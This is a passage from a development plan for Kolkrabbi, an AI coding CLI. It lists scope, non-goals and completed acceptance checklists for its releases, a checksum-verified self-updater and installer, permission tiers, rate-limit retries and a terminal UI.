- Re-review `site/capabilities.html` against the source and move every card that shipped out of
  "designed"/"planned", add a REACH section for item 26, and delete the claims that stopped being
  true — `--yolo` above all, which E13.2 removed.
- Ratchet the new page claims in `scripts/test-site.sh` so the catalog cannot drift back silently.
- Correct the statements in the shipped `README.md` that the same commits made false.
- Move the release line — the installer badge and the GoReleaser snapshot template — to 1.2.0.

Non-goals:

- No protocol-version bump, Windows artifact, package-manager distribution, desktop bundle, or
  installer algorithm change.
- No new product capability in this leaf: it publishes and describes what is already tested.
- No clean-machine rehearsal; `T0.5` stays open and is not implied by this release.
- No major version, though `--yolo`/`-y` were removed: the owner chose the minor line on
  2026-08-26, and the release notes say the flag is gone.

Acceptance checklist:

- [x] every "Available now" card on the capability page names behavior present in the current source
  and covered by the offline suite; anything gated (localia's unpinned runtime, the gateway key a
  subscription session still expects, steering from a device) says so on the card.
- [x] `scripts/test-site.sh` fails on a catalog that drops the shipped orchestrator, saga,
  permission rules, dashboard, event service, or per-device tokens, and on any return of `yolo`.
- [x] the complete repository gate passes before the tag: 1992 tests, all site, installer, release
  and spec contracts green.
- [x] only the reviewed files are committed and pushed to `main`; unrelated dirty files untouched.
- [x] tag `v1.2.0` points to commit `792a53c4`, its release workflow succeeds, and the signed
  manifest plus four archives pass the independent verifier.
- [x] the build log records the review, the gate, the commit/tag, and the published assets.

### R1.1 v1.1.0 installer-upgrade release — active detail

Scope:

- Interpret the requested `v1.1` as the repository's required three-part SemVer tag `v1.1.0`.
- Update current release-candidate surfaces and fixtures while preserving historical v0.1 records
  and protocol version `0`.
- Rehearse all four Darwin/Linux amd64/arm64 archives, push one tested release-candidate commit and
  immutable tag, then authenticate and inspect the public assets.
- Prove the live website installer discovers `v1.1.0`, upgrades an existing public `v0.1.0`
  executable through the checksum-verified path, and leaves `kolk version` reporting `v1.1.0`.

Non-goals:

- No protocol-version bump, Windows artifact, package-manager distribution, desktop bundle,
  notarization, updater algorithm change, forced installation path change, or historical-document
  rewrite.
- No tag before offline release rehearsal and the complete repository gate pass.
- No staging or mutation of the owner's unrelated lock file, README work, build directory, or plan
  drafts.

Acceptance checklist:

- [x] current website/release-candidate assertions name v1.1/v1.1.0 and fail only on the old current
  labels before production changes.
- [x] installer and public-verifier matrices rehearse v1.1.0, including an upgrade from v0.1.0 and
  a no-download equal-version check.
- [x] the strict tag guard accepts `v1.1.0` and rejects abbreviated `v1.1`.
- [x] GoReleaser validates and builds exactly four stamped snapshot archives with matching SHA-256
  rows; all focused and complete repository gates pass before publication.
- [x] only the reviewed release-candidate files are committed and pushed to `main`; unrelated dirty
  files remain untouched.
- [x] tag `v1.1.0` points to that exact commit, its release workflow succeeds, and the signed public
  manifest plus four archives pass the independent verifier.
- [x] GitHub's latest redirect and the live no-store installer resolve v1.1.0; a real existing
  v0.1.0 installation upgrades and reports the new version.
- [x] the build log records red, green, rehearsal, commit/tag, workflow, assets, and live handoff.

### U0.1 explicit auto-approve command — active detail

**Superseded in part, 2026-08-27.** E13.2 removed `--yolo`/`-y` and `Agent.Yolo`; the scope below
describes toggling a boolean that no longer exists. `/auto-approve` itself is still real, as the
middle of three permission tiers. Read this entry as history, and `docs/plan/13-tools-permissions-sandboxing.md`
for what the surface is now.

Scope:

- Add `/auto-approve [on|off]` to the interactive command surface and `/help`.
- With no argument or `on`, enable the same live `Agent.Yolo` state already used by `-y`; with
  `off`, disable it.
- Report the resulting state clearly and warn when tool actions will run without confirmation.
- Keep `/yolo` as the existing compatibility toggle.

Non-goals:

- No persisted permission setting, config key, permanent rule, global toggle, environment variable,
  or top-level command that changes future processes.
- No change to which tools require approval, the hard safety boundary, non-interactive behavior,
  permission protocol events, engine ownership, or provider-executed tools.
- No self-update or loading animation in this checkpoint; U0.2 and U0.3 own those independently.

Acceptance checklist:

- [x] `/auto-approve` and `/auto-approve on` enable auto-approval idempotently; the output names the
  risk plainly.
- [x] `/auto-approve off` disables auto-approval and reports that tool actions will ask first.
- [x] an unknown argument prints the exact usage, leaves the current state unchanged, and does not
  exit the REPL.
- [x] `/help` lists the explicit command, while `/yolo` retains its prior toggle behavior.
- [x] focused CLI tests and every repository gate pass, and the build log records red/green/refactor.

### U0.1b mode-prefixed prompt — verified detail

Scope:

- Render the interactive input prompt as `kolk-code>`, `kolk-chat>`, or `kolk-agent>` from the
  current engine mode.
- Reflect a `/mode` change on the next prompt without changing the existing banner or mode state.

Non-goals:

- No prompt configurability, theme change, loading animation, status-line redesign, non-interactive
  output change, or mode behavior change.

Acceptance checklist:

- [x] fresh interactive prompts use `kolk-<mode>` for all three supported modes.
- [x] changing mode changes the next prefix, and no legacy bare `code>`, `chat>`, or `agent>` prompt
  is rendered.
- [x] focused CLI tests and every repository gate pass; the build log records red/green/refactor.

### U0.1c in-session model catalog — verified detail

Scope:

- Make bare `/model` print the current model and list the active provider's available catalog using
  the same sorting, filtering, context-length, and pricing renderer as top-level `kolk models`.
- Keep `/model <id>` as a direct session switch with no catalog request.
- Thread the REPL context through slash handling so catalog cancellation follows the running CLI.

Non-goals:

- No interactive picker, paging, fuzzy search, automatic model switch, catalog cache, provider
  redesign, free-model policy, config persistence, or change to top-level `kolk models` semantics.
- No self-update, loading animation, or model API request when an explicit ID is supplied.

Acceptance checklist:

- [x] bare `/model` prints the current ID followed by the sorted catalog with the existing context
  and pricing format.
- [x] a catalog failure is reported clearly, does not change the current model, and does not exit
  the session.
- [x] `/model <id>` changes both agent and session model without fetching the catalog.
- [x] `/help` describes the list-or-switch behavior and slash commands receive the REPL context.
- [x] focused CLI tests and every repository gate pass; the build log records red/green/refactor.

### U0.1d resilient agent completion — verified detail

Scope:

- Treat an assistant response with neither text nor tool calls as an invalid completion, retry once
  with a concise instruction to continue the original request, then resume the ordinary tool loop.
- If the retry is also empty, return a visible actionable error instead of silently ending or
  spending without a bound.
- Strengthen code/agent instructions so project-building requests move from relevant plan inspection
  to one concrete verified checkpoint, stopping only when that step is complete or blocked.
- Explain that `/yolo` and `/auto-approve` affect this process and that `kolk --yolo` enables the
  setting when starting a later process.

Non-goals:

- No persisted auto-approve default, unattended background process, endless autonomous loop,
  heuristic classification of whether prose is "complete", model fallback, routing, or TUI change.
- No extra retry for transport errors, non-empty model answers, or tool failures; no synthetic
  recovery message in saved session history.
- No self-update, loading animation, or persistent input area; U0.2–U0.4 own those independently.

Acceptance checklist:

- [x] one empty provider completion triggers exactly one retry and can continue through tool calls
  to a non-empty final answer.
- [x] the retry includes a continuation instruction while saved history excludes the empty response
  and synthetic instruction.
- [x] two consecutive empty completions return a clear bounded error that suggests `/model`.
- [x] the code/agent system prompt explicitly requires a concrete checkpoint or blocker after
  inspection.
- [x] enabling auto-approve names its process-local scope and the `kolk --yolo` launch form; existing
  confirmation behavior and launch flag remain unchanged.
- [x] focused engine/CLI tests and every repository gate pass; the build log records the live-session
  diagnosis and red/green/refactor evidence.

### U0.1e bounded rate-limit recovery — verified detail

Scope:

- Preserve non-success chat responses as a typed provider HTTP error with status, safe response
  detail, `Retry-After`, and the OpenRouter provider/limit-source metadata when present.
- Put one shared retry boundary around every engine model call: ordinary chat/code replies, agent
  planning, subagents, and synthesis.
- Retry only a pre-stream HTTP `429`, at most three times after the initial request. Use bounded
  1s/2s/4s backoff, honor a longer `Retry-After` only within the same four-second cap, and make each
  wait immediately cancellable. Surface longer server delays instead of appearing frozen.
- After exhaustion, return a concise error that identifies the selected model and suggests `/model`
  instead of dropping back to an unexplained prompt.

Non-goals:

- No endless retry, background continuation, retry after streamed tokens, or retry of authentication,
  billing, context-window, server, transport, malformed-stream, empty-completion, or tool errors.
- No automatic model rotation, provider switch, paid route, account-cap guess, catalog ranking,
  cooldown persistence, or configuration. Item 8 owns policy-aware free-model handoff.
- No loading animation or terminal-layout change; U0.3 and U0.4 own visible activity and TUI state.

Acceptance checklist:

- [x] a structured OpenRouter `429` remains discoverable with `errors.As`, retains safe classification
  metadata, and preserves the existing credential scrubbing boundary.
- [x] a temporary `429` on any engine model call retries the identical model request and succeeds
  without duplicating conversation history or accounting.
- [x] four consecutive `429` responses make exactly four requests, perform only the three bounded
  waits, and return an actionable error naming `/model`.
- [x] cancellation during backoff returns the context error without another provider request.
- [x] non-429 errors are never retried, and no retry can begin after response streaming has started.
- [x] focused provider/engine tests and every repository gate pass; the build log records the live
  `stealth/ox-alpha` upstream-pool diagnosis and red/green/refactor evidence.

### U0.2 verified self-update — verified detail

Implementation leaves (U0.2a–U0.2d) close independently in that order; only the current leaf may
change production code.

#### U0.2a update identity and discovery — verified acceptance

Scope:

- Parse only stable `major.minor.patch` build identities (with an optional leading `v`) and compare
  their numeric components rather than their text.
- Resolve exactly Darwin/Linux on amd64/arm64 and derive the GoReleaser archive name from the
  normalized version and target.
- Discover latest with a cancellable `HEAD` request and accept only a successful final redirect at
  the same origin and exact `/onembyte/kolkrabbi/releases/tag/v<stable>` path.

Non-goals:

- No artifact request, checksum/archive parser, executable lookup/write, CLI command, API key, user
  setting, alternate origin, prerelease, downgrade, or background check.

Acceptance checklist:

- [x] stable versions normalize and compare numerically; dev, incomplete, prerelease, build metadata,
  leading-zero, non-numeric, and overflowing versions fail closed.
- [x] exactly four supported targets produce archive names identical to GoReleaser; all other OS or
  architecture pairs fail.
- [x] latest discovery uses `HEAD`, honors cancellation, requires a 2xx final response, and rejects
  no redirect, another origin/path, suffix/query, leading-zero tag, or non-stable tag.
- [x] the official origin is a compiled constant, the package is standard-library-only at L0, and
  this leaf performs no filesystem mutation.
- [x] focused self-update and architecture tests plus every repository gate pass; the build log
  records red/green/refactor.

#### U0.2b bounded artifact verification — verified acceptance

Scope:

- Download the exact versioned `checksums.txt` and target archive paths with cancellable `GET`
  requests, successful status requirements, content-length/read bounds, and closed response bodies.
- Require one unique exact archive-name row with a 64-character lowercase SHA-256 and compare it to
  the downloaded archive before opening gzip or tar data.
- Accept exactly one regular `kolk`, `README.md`, and `LICENSE`, enforce member-size and total bounds,
  reject an empty executable, and return only the verified executable bytes in memory.

Non-goals:

- No executable lookup/write, temporary file, archive extraction directory, chmod/rename, CLI/slash
  command, API key, version comparison, retry policy, alternate origin, or Sigstore client.
- No trust claim beyond matching the installer checksum boundary; release CI remains responsible for
  authenticating the signed checksum manifest before publication.

Acceptance checklist:

- [x] successful verification requests the exact manifest then archive and returns the binary bytes.
- [x] non-2xx, cancellation, declared or streamed oversize, malformed/missing/duplicate/uppercase
  digest, and SHA-256 mismatch fail closed; invalid manifests trigger no archive request.
- [x] digest verification precedes decompression, and invalid gzip/tar data is never interpreted after
  a mismatch.
- [x] archives with missing, extra, duplicate, non-regular, linked, prefixed, oversized, truncated,
  or empty executable members fail; the exact three-member regular archive succeeds.
- [x] verification remains standard-library-only, memory-only, and context-cancellable; focused tests,
  architecture and every repository gate pass with red/green/refactor recorded.

#### U0.2c atomic executable replacement — verified acceptance

Scope:

- Compose preflight, latest discovery, comparison, executable resolution, verified artifact fetch,
  and atomic replacement behind one public updater function for both future command surfaces.
- Reject an unstable running build or unsupported target before network/filesystem work; skip the
  artifact and executable lookup when latest is equal or older.
- Resolve symlinks to the running regular executable, then replace that target once with verified
  bytes and mode `0755` using the existing same-directory atomic-file primitive.
- Distinguish a post-rename directory-sync failure as an installed update with a durability warning,
  so every returned failure still means the old executable is intact.

Non-goals:

- No CLI/slash/help/output, API key/state, alternate executable argument, package-manager detection,
  privilege escalation, rollback copy, downgrade, Windows update, background check, or relaunch.
- No second write path, extraction directory, shell command, or artifact revalidation change.

Acceptance checklist:

- [x] dev/malformed version and unsupported target fail before network, executable lookup, or write.
- [x] same/newer running versions make only latest discovery requests and return an unchanged result
  without executable lookup, artifact download, or downgrade.
- [x] a newer valid release resolves a regular symlink target, installs exact verified bytes at mode
  `0755`, leaves the symlink intact, and reports current/latest/path.
- [x] discovery, executable resolution, download, verification, cancellation, and pre-commit write
  failures preserve the exact old bytes and mode.
- [x] a directory-sync error after atomic rename reports updated-with-warning rather than a false
  failure, while non-committed errors remain failures.
- [x] focused updater/atomic-file tests and race coverage plus every repository gate pass; the build
  log records red/green/refactor.

#### U0.2d update command surfaces — verified acceptance

Scope:

- Add argument-free top-level `kolk update` before the default session path, so it calls the shared
  updater without resolving a home, key, config, migration, provider, or session.
- Add argument-free in-session `/update` using the same app-level updater seam and active REPL
  context; it reports errors without exiting or changing the session.
- Render already-current, updated current→latest/path, durability warning, and in-session restart
  guidance consistently; document both forms in generated and slash help.

Non-goals:

- No duplicate updater, URL/version/path arguments, force/downgrade/channel flags, startup/background
  check, confirmation prompt, API key, config setting, relaunch, or release publication.
- No TUI/loading state; U0.3 and U0.4 own presentation beyond deterministic text.

Acceptance checklist:

- [x] top-level update succeeds with no API key or directories, appears in generated help, and calls
  exactly one injected updater.
- [x] arguments are usage errors before an updater call; updater errors exit 1 at top level.
- [x] unchanged and updated results include normalized current/latest facts; success names the path,
  and durability warnings go to stderr.
- [x] `/update` appears in help, uses the active context, rejects arguments, and keeps the session
  alive after updater error or success.
- [x] a successful in-session replacement says to restart Kolkrabbi before the new version is active;
  unchanged results do not claim a restart.
- [x] focused CLI tests and every repository gate pass; command/static-surface tests and build log
  record red/green/refactor.

#### U0.2e narrated update progress — verified acceptance

Scope:

- Make both `kolk update` and in-session `/update` print the running version before beginning the
  network check, followed by an explicit latest-release check line.
- End unchanged checks with `Kolk is up to date (<version>)`; end replacements with the normalized
  current→latest transition and installed path, retaining in-session restart guidance.
- Use one injected running-version seam in CLI tests so the pre-network line is deterministic and
  production still reads the stamped build identity.

Non-goals:

- No updater algorithm, release discovery, artifact verification, replacement, retry, progress bar,
  animation, background check, startup check, package-manager integration, or automatic relaunch.
- No installer behavior in this leaf; T0.4b2 owns existing-install detection independently.

Acceptance checklist:

- [x] both command surfaces print `Current version:` before invoking the updater and then
  `Checking for updates to latest version...`.
- [x] unchanged equal-version output is exactly recognizable as `Kolk is up to date (<version>)`;
  a newer local build names both versions, and neither path asks
  for a restart.
- [x] updated output names current→latest and the installed path; only the in-session form asks for
  a restart.
- [x] updater errors retain the already-printed current/check context and preserve existing top-level
  exit and non-fatal REPL behavior.
- [x] focused CLI tests and every repository gate pass; build log records red/green/refactor.

Scope:

- Add `kolk update` outside a session and `/update` inside a session; both call one updater and need
  no API key or Kolkrabbi state.
- Resolve GitHub's latest stable release through the exact `onembyte/kolkrabbi` tag path, compare it
  with the running stable version, and avoid downloading assets when already current or newer.
- Select the same Darwin/Linux and amd64/arm64 archive names as the installer, download bounded
  release assets, require one exact SHA-256 manifest entry, and accept exactly one regular `kolk`,
  `README.md`, and `LICENSE` archive member.
- Resolve the running executable, atomically replace it with mode `0755`, and tell an in-session user
  to restart before the new build is active.

Non-goals:

- No update from `main`, arbitrary repository/URL, prerelease channel, downgrade flag, Windows
  artifact, package-manager integration, background update, startup check, or persisted preference.
- No shelling out to the website installer and no dependence on curl, tar, a Go toolchain, or a
  third-party Go module.
- No claim that a sidecar checksum replaces the release workflow's Sigstore provenance check; the
  updater matches the public installer's client-side integrity boundary while CI authenticates the
  signed manifest before publishing.
- No animation, engine behavior, provider call, session mutation, or auto-approve change.

Acceptance checklist:

- [x] stable versions compare numerically; dev/malformed versions and unsupported targets fail
  before network or filesystem mutation, and a same/newer build downloads no archive.
- [x] latest discovery accepts only the exact repository's `releases/tag/v<stable-semver>` result.
- [x] manifest and archive downloads are status/size bounded; the manifest must contain one unique
  lowercase SHA-256 for the exact target archive, and digest mismatch fails closed.
- [x] archive validation accepts exactly regular `kolk`, `README.md`, and `LICENSE` members, rejects
  links, extra/missing/duplicate paths and empty binaries, and never writes before all checks pass.
- [x] successful replacement is atomic, mode `0755`, and reports old/new versions and path; every
  download, validation, cancellation, or write failure preserves the previous executable.
- [x] `kolk update` is in top-level help, rejects arguments, runs without a key, and reports updated
  or already-current state.
- [x] `/update` is in session help, rejects arguments without making a request, uses the same updater,
  continues the session after errors, and tells the user to restart after a replacement.
- [x] focused updater/CLI tests, race-sensitive tests where applicable, architecture and full
  repository gates pass; the build log records red/green/refactor.

### U0.3 loading octopus — verified detail

Implementation leaves (U0.3a–U0.3b) close independently in that order. The engine lifecycle must be
green and byte-stable before terminal detection, animation timing, or cursor control is introduced.

#### U0.3a provider-wait lifecycle — verified acceptance

Scope:

- Add an optional engine activity interface whose `Start` receives the active turn context and one
  deterministic phase label, and whose returned stop function is owned by the caller.
- Start once around each logical model call, spanning U0.1e's internal retries, and stop exactly once
  before the first visible content token or before returning a tool-only response or any error.
- Label ordinary chat/code calls as `thinking`, agent planning as `planning`, subagent calls as
  `working`, and final synthesis as `synthesizing`.

Non-goals:

- No goroutine, timer, frame, colour, terminal detection, cursor control, CLI wiring, or output byte
  change. U0.3b owns every visual and concurrency detail.
- No provider, retry, model, tool, permission, session, stats, prompt, or orchestration behavior
  change.

Acceptance checklist:

- [x] visible content is preceded by exactly one activity stop, while tool-only and error paths stop
  before returning to tool handling or the REPL.
- [x] planner, subagent, synthesis, and ordinary calls expose the frozen phase labels through the
  same seam.
- [x] one logical call that retries a `429` starts and stops activity only once.
- [x] a cancelled context reaches the indicator and still produces one stop with no leaked activity.
- [x] a nil indicator preserves existing output byte-for-byte; focused engine tests, race coverage,
  and every repository gate pass with red/green/refactor recorded.

#### U0.3b TTY octopus renderer — verified acceptance

Scope:

- Show a small Kolkrabbi octopus animation only while an interactive terminal is waiting for the
  first provider output, and erase it before streamed content, approval prompts, errors, or the next
  input prompt render.
- Wait 120 ms before the first frame to avoid flicker on fast responses, then animate a purple
  Braille spinner beside `🐙` and U0.3a's phase on one saved cursor position every 120 ms.
- Define interactive animation as both stdin and stdout being supported terminals with `TERM` other
  than `dumb`; never enable it for single-shot prompts. Honor `NO_COLOR`/`KOLK_NO_COLOR` without
  disabling the non-colour status.
- Give cancellation ownership to the turn context, stop and join the animation before returning,
  and keep exactly one renderer writing each terminal region at a time.
- Preserve a deterministic single-line status seam that U0.4 can adopt as its activity indicator.

Non-goals:

- No animation in redirected/piped output, log files, tests without an explicit fake terminal, or
  unsupported terminals; no full-screen layout, persistent editor, progress estimation, or network
  thread mutation.
- No agent retry, updater, model, session, tool, or permission behavior change.

Acceptance checklist:

- [x] a fake clock proves the 120 ms grace, deterministic frame order, phase text, purple/no-colour
  rendering, and cursor restoration before streamed output.
- [x] interactive waiting shows octopus frames and removes them before every response path.
- [x] cancellation and fast responses leave no goroutine, partial escape sequence, stale frame, or
  duplicated prompt behind.
- [x] redirected stdin/stdout, `TERM=dumb`, and single-shot output remain byte-stable and contain no
  animation or cursor-control bytes.
- [x] focused renderer tests include a fake clock/terminal and race coverage; all repository gates
  pass and the build log records red/green/refactor.

### U0.4 persistent terminal UI — planned detail

Delivery leaves (only one active at a time):

- [x] **U0.4a pure screen model** — separate transcript, activity, status, suggestions, and draft;
  prove output updates cannot mutate or displace the composer.
- [x] **U0.4b terminal runtime and composer** — add raw terminal input, multiline editing, resize,
  streamed-output routing, cancellation, and the plain-terminal fallback.
- [x] **U0.4c slash discovery** — show recent commands after `/`, filter live by the typed prefix,
  navigate/select suggestions, and keep the command catalog single-sourced.
- [x] **U0.4d status and release** — connect model/mode/effort/session/approval/lifecycle state,
  complete accessibility/platform/budget gates, and publish the first solid TUI cut as `v1.1.2`.

Scope:

- Replace the interactive single-line prompt with a persistent bottom composer that supports
  multiline editing, cursor movement, history, paste, submit/newline shortcuts, and keeps the draft
  visible while responses and tool activity update above it.
- Keep a compact status row visible with the selected model, mode, effort, session, approval state,
  and current lifecycle (`thinking`, tool name, streaming, interrupted, failed, or ready).
- Reuse U0.3's octopus as the working indicator; render streamed Markdown, code, diffs, tool calls,
  confirmations, and errors without moving or destroying the input draft.
- Handle terminal resize, narrow layouts, Unicode width, scrollback, Ctrl+C turn cancellation,
  Ctrl+D/`/exit`, `NO_COLOR`, and an accessible plain-terminal fallback.
- Define visual tokens so the default purple Kolkrabbi theme and later selectable themes share one
  renderer rather than embedding colors in engine output.

Non-goals:

- No imitation of Codex names, logos, proprietary output, or undisclosed behavior; “Codex-style”
  means the interaction qualities above.
- No engine/provider business logic inside the TUI, desktop/web client, daemon transport, mouse-only
  control, mandatory full-screen alternate buffer, or loss of scripted/piped CLI compatibility.
- No framework choice until PLAN item 11's spike measures binary size, cold start, platform support,
  input correctness, and protocol boundaries against the existing budgets.

Spike decision (2026-08-24):

- Bubble Tea v2.0.9 plus Bubbles v2.2.0 cross-compiles and stays below the binary-size budget, but
  expands the root graph to 18 modules and therefore fails the enforced two-module supply-chain
  budget before production integration.
- Use the official `golang.org/x/term` v0.45.0 primitive behind `internal/term`: together with the
  existing `x/sys` it keeps exactly two modules, cross-compiles on Windows, and leaves the screen
  model in `internal/tui` dependency-free. Do not weaken the dependency budget.

Acceptance checklist:

- [x] the composer remains visible and retains its exact draft across response tokens, tool status,
  confirmation overlays, and resize; one Ctrl+C deliberately clears only that draft.
- [x] the selected model is always visible; mode, effort, session, approval, and lifecycle states are
  accurate after slash-command changes and errors.
- [x] keyboard behavior, multiline/paste handling, narrow/Unicode layouts, Markdown/diff rendering,
  and approval focus have deterministic golden or model tests. (Markdown/diff transcript rendering
  closed by ox-alpha 2026-08-24 02:10 — `internal/tui/markdown.go` + `markdown_test.go`: eight
  golden/model tests covering headings+spacer rows, bullet/ordered lists, block quotes, fenced code
  in composer tokens (`╭─ <lang>`/`│ `/`╰─`), `diff` fences with `-`/`+`/context markers, ANSI/OSC
  stripping before structural parsing, streaming split-render without duplication, determinism
  across repeated views, and narrow-width cell alignment (CJK + emoji) without mutating stored
  bytes; stdlib-only via the U0.4 spike decision. Evidence: `go test -race ./internal/tui` ok;
  full repo `go test ./...` 23 pkgs ok; `make lint` 0 issues; `make fmt-check`, `make arch`,
  `make platforms` clean; `make budgets` 4.2 ms cold start / 1291 tests / 2 third-party modules;
  surface 13, site 110, installer 72, spec 29 checks; Windows amd64 vet ok. Keyboard/multiline/
  paste/approval coverage was already present from editor/controller model tests.)
- [x] non-interactive commands and redirected input/output retain the existing plain CLI contract.
- [x] the chosen framework remains within reviewed dependency, binary-size, startup, Windows build,
  race, and architecture budgets; the full repository gates pass.

### R0.1 v0.1 two-mode surface — verified detail

Scope:

- Expose exactly `chat` and `code` through command-line flags, the REPL, help, the README, and the
  landing page.
- Keep `code` as the zero-configuration default so plain `kolk` starts the owner's first test in
  code mode after credential setup.
- Keep the existing experimental orchestration implementation and its offline tests intact, but
  make it unreachable through every v0.1 user surface.

Non-goals:

- No installer, release workflow, tag, visibility, or public asset mutation in this checkpoint.
- No deletion, redesign, expansion, or public documentation of the future agentic mode.
- No model, provider, tool-loop, session, credential, or effort behavior change.

Acceptance checklist:

- [x] the public engine mode registry contains exactly `chat` and `code`, and rejects `agent`.
- [x] `--mode chat` and `--mode code` parse; `--mode agent` is a usage error before runtime setup.
- [x] `/mode agent` is rejected without changing the current mode, while `/help` lists only the
  two release modes.
- [x] CLI help, README, and landing-page v0.1 claims describe chat and code without advertising an
  agent mode.
- [x] zero-value engine options still select `code`, and focused code-mode behavior remains green.
- [x] the dormant internal orchestration tests remain green, proving the future implementation was
  preserved behind the release boundary.
- [x] focused checks and the full repository gates pass, and the build log records red and green.

### R0.2 agentic surface restoration — verified detail

R0.1 remains the verified history of the first working-deploy boundary. This checkpoint supersedes
that product boundary at the owner's direction; it does not rewrite the earlier evidence.

Scope:

- Expose exactly `chat`, `code`, and `agent` through the engine registry, command-line flags, the
  REPL, help, README, landing page, and their static guard rails.
- Preserve `code` as the zero-configuration default for plain `kolk`.
- Surface the existing agent pipeline truthfully: one planner, ordered isolated subagents, then one
  synthesis response; effort controls both the configured model tier and the maximum task count.
- Retain invalid-mode rejection and all existing chat-, code-, session-, tool-, and confirmation
  behavior.

Non-goals:

- No orchestration redesign, parallel execution, provider work, protocol integration, or new tool
  permissions in this checkpoint.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.
- No changes to the owner's unhardened mode-plan draft.

Acceptance checklist:

- [x] the public engine registry contains exactly `chat`, `code`, and `agent`; all three can be set,
  while an unknown value is rejected without changing the current mode.
- [x] `--mode agent` parses before runtime setup, while an unknown command-line mode remains a usage
  error.
- [x] `/mode agent` switches the active session and `/help` names all three modes.
- [x] CLI help, README, and landing page explain agent mode as ordered orchestration without claiming
  parallel execution.
- [x] zero-value engine options still select `code`, and the existing orchestrated end-to-end and
  single-task fallback tests remain green.
- [x] focused red/green evidence and every full repository gate pass, and the build log records the
  checkpoint.

### T0.4 release and installer — active detail

Scope:

- Publish one versioned `kolk` archive for Darwin and Linux on amd64 and arm64, with cgo disabled,
  build identity stamped, SHA-256 checksums, and a keyless Sigstore signature over the checksum
  manifest.
- Trigger releases only from a semantic `v*` tag through a minimal-permission GitHub Actions job.
- Serve one reviewed `site/install.sh` that discovers the latest release, selects the exact target,
  verifies its SHA-256 before extraction, and installs `kolk` into an explicit or usable PATH
  directory.
- Prove archive contents, installer behavior, failure safety, and the public URLs before declaring
  the owner trial installable.

Non-goals:

- No Windows artifact while Windows locking remains an explicit runtime stub.
- No Homebrew, Scoop, Winget, AUR, deb/rpm, auto-updater, desktop bundle, notarization, or package
  manager receipt.
- No installer execution with root privileges in tests and no live release mutation before every
  offline contract and snapshot is green.
- No claim that a checksum downloaded beside an archive replaces signature/provenance verification;
  the release publishes the Sigstore bundle separately and the installer enforces SHA-256 integrity.

Delivery slices:

- [x] **T0.4a artifact contract** — deterministic four-target archive names, stamped build info,
  SHA-256 manifest, checksum signature config, and a snapshot content test.
- [x] **T0.4b installer** — platform mapping, version discovery/pinning, download, verification,
  safe extraction, PATH placement, atomic replacement, and offline failure matrix.
- [x] **T0.4c tag workflow** — tag-only Actions job, pinned tools, minimal permissions, config check,
  snapshot rehearsal, and no release from branches or pull requests.
- [x] **T0.4d1 release verifier** — independently authenticate the published checksum bundle,
  inspect all four assets, and execute the host build before any owner-test claim.
- [x] **T0.4d2 public cutover** — explicit owner approval for the artifact host, `v0.1.0`, live
  asset/Pages verification, and handoff to T0.5.

Release blocker recorded on 2026-08-23: GitHub reports `onembyte/kolkrabbi` as **private**. The
pipeline and installer can be built and tested privately, but an unauthenticated public installer
cannot download its GitHub Release assets until the owner approves the repository visibility change.

#### T0.4b installer acceptance

- [x] the script is inert until its final `main "$@"` line, and a truncated stdin stream performs
  no network request or install side effect.
- [x] Darwin/Linux and amd64/arm64 map to the four GoReleaser archive names; every other OS or
  architecture fails before download.
- [x] a pinned `KOLK_VERSION=v0.1.0` and GitHub's latest-release redirect resolve to the same strict
  semantic-version path, while unsafe version text fails before download.
- [x] `KOLK_INSTALL_DIR` requires an absolute path; without it, the installer chooses an existing
  writable directory on `PATH` and prefers the user's conventional bin directories.
- [x] the archive and `checksums.txt` download over HTTPS with failure/retry limits, and the exact
  archive SHA-256 must match a single manifest entry before extraction.
- [x] extraction accepts exactly one regular `kolk`, `README.md`, and `LICENSE`; links, missing
  entries, and unexpected paths cannot write the destination.
- [x] a same-directory temporary file becomes mode `0755` and atomically replaces `kolk`; checksum
  or archive failures preserve an existing binary and cleanup all staging paths.
- [x] Bash 3.2 syntax, ShellCheck, 56 offline matrix checks, adjacent site/release contracts, and the
  full repository gate pass.

#### T0.4b2 existing-install version awareness — verified acceptance

Scope:

- After resolving the requested/latest release and destination, ask an executable existing target
  for its stable `kolk version` identity before downloading release assets.
- For an unpinned install, skip manifest/archive downloads when the installed version equals the
  latest release, upgrade when it is older, and leave a newer local build untouched.
- Preserve explicit `KOLK_VERSION` as an intentional exact reinstall/pinning override and preserve
  the current verified atomic replacement path for upgrades.

Non-goals:

- No background/startup update, package-manager receipt, privilege escalation, alternate install
  path, prerelease ordering, Windows, rollback, auto-run after update, or updater-Go-code change.
- No trust in unrecognized version output: failure to obtain one stable version falls back to the
  existing verified reinstall path rather than skipping installation.

Acceptance checklist:

- [x] an older unpinned installation reports current→latest, downloads verified assets, and replaces
  the binary with the latest executable.
- [x] an equal unpinned installation reports up to date and performs only latest-version discovery,
  with no checksum/archive request or target mutation.
- [x] a newer unpinned installation names current/latest, performs no artifact request, and remains
  byte-identical.
- [x] malformed or failing existing version output cannot suppress installation; an explicit pinned
  version still installs even when an existing stable version compares equal or newer.
- [x] the numeric three-component comparison is Bash-3.2-compatible and handles component widths
  without shell-integer overflow or lexical `0.10` mistakes.
- [x] installer syntax, focused offline matrix, adjacent release/site checks, and every repository
  gate pass; build log records red/green/refactor.

#### T0.4c tag workflow acceptance

- [x] only pushed `v*` tags can start the workflow, and a strict executable SemVer guard rejects
  malformed tags before any release step.
- [x] verification runs with read-only contents permission; only the dependent publish job receives
  `contents: write` and `id-token: write` for GitHub Releases and keyless Cosign signing.
- [x] every third-party action is pinned to a full immutable commit with its reviewed version noted.
- [x] the workflow runs the repository gate, `goreleaser check`, and the four-target snapshot before
  the publish job can run.
- [x] GoReleaser is fixed to the snapshot-tested v2.17.1 and publishes with `release --clean` using
  only the repository-scoped `GITHUB_TOKEN`.
- [x] a fast workflow contract is enforced by `make check` and ordinary branch/PR CI.

#### T0.4d1 release verifier acceptance

- [x] a strict v-prefixed SemVer selects one immutable GitHub Release path and exact signer identity.
- [x] `checksums.txt` and its Sigstore bundle download first; Cosign must authenticate the bundle,
  release workflow, tag, and GitHub OIDC issuer before any archive download.
- [x] the signed manifest contains exactly the four expected archive names and one lowercase
  SHA-256 for each; unknown, missing, duplicate, or malformed rows fail closed.
- [x] every archive matches its signed digest and contains exactly regular `kolk`, `README.md`, and
  `LICENSE` members.
- [x] the host archive executes and reports the requested version plus matching OS/architecture,
  never an unstamped `dev` identity.
- [x] signature, download, checksum, manifest, archive, and build-identity failures are covered
  offline; the live release workflow runs the same verifier after publishing.
- [x] the verifier contract is part of ordinary CI and the complete repository gate passes.

### T0.3 first-run path — detail

Scope:

